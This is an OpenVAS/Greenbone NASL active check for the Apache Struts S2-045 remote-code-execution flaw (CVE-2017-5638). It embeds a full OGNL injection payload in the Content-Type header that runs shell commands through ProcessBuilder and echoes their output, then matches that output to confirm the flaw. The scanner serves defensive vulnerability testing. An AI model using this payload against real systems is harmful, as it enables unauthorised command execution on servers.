# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140180");
  script_version("2025-03-19T05:38:35+0000");
  script_tag(name:"last_modification", value:"2025-03-19 05:38:35 +0000 (Wed, 19 Mar 2025)");
  script_tag(name:"creation_date", value:"2017-03-08 12:19:09 +0100 (Wed, 08 Mar 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-07-25 13:58:42 +0000 (Thu, 25 Jul 2024)");

  script_cve_id("CVE-2017-5638");

  script_name("Apache Struts Security Update (S2-045) - Active Check");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "os_detection.nasl",
                      "gb_vmware_vcenter_server_http_detect.nasl",
                      "gb_microfocus_service_manager_http_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("www/action_jsp_do");

  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-045");
  script_xref(name:"Advisory-ID", value:"S2-045");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  script_tag(name:"summary", value:"Apache Struts is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"Successfully exploiting this issue may allow an attacker to
  execute arbitrary code in the context of the affected application.");

  script_tag(name:"affected", value:"Apache Struts 2.3.5 through 2.3.31 and 2.5 through 2.5.10.");

  script_tag(name:"solution", value:"Updates are available. Please see the referenced vendor
  advisory for more information.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port( default:8080 );
host = http_host_name( dont_add_port:TRUE );

urls = make_list();

foreach ext( make_list( "action", "do", "jsp" ) ) {
  exts = http_get_kb_file_extensions( port:port, host:host, ext:ext );
  if( exts && is_array( exts ) ) {
    urls = make_list( urls, exts );
  }
}

if( get_kb_item( "vmware/vcenter/server/http/detected" ) )
  urls = make_list_unique( "/statsreport/", urls );

cmds = exploit_commands();
x = 0;
vt_strings = get_vt_strings();

foreach url( urls ) {

  x++;
  bound = vt_strings["default_rand"];

  data = '--' + bound + '\r\n' +
         'Content-Disposition: form-data; name="' + vt_strings["default"] + '"; filename="' + vt_strings["default"] + '.txt"\r\n' +
         'Content-Type: text/plain\r\n' +
         '\r\n' +
         vt_strings["default"] + '\r\n' +
         '\r\n' +
         '--' + bound + '--';

  foreach cmd( keys( cmds ) ) {

    c = "{'" + cmds[ cmd ] + "'}";

    ex = "%{(#" + vt_strings["default"] + "='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):" +
         "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com." +
         "opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses()." +
         "clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder(" + c + "))." +
         "(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse()." +
         "getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";

    req = http_post_put_req( port:port, url:url, data:data, add_headers:make_array( "Content-Type:", ex ) );
    buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( egrep( pattern:cmd, string:buf ) ) {
      report = 'It was possible to execute the command `' + cmds[ cmd ] + '` on the remote host.\n\nRequest:\n\n' + req + '\n\nResponse:\n\n' + buf;
      security_message( port:port, data:report );
      exit( 0 );
    }
  }

  if( x > 25 ) # nb: No need to continue, the system is very unlikely affected...
    break;
}

exit( 0 );
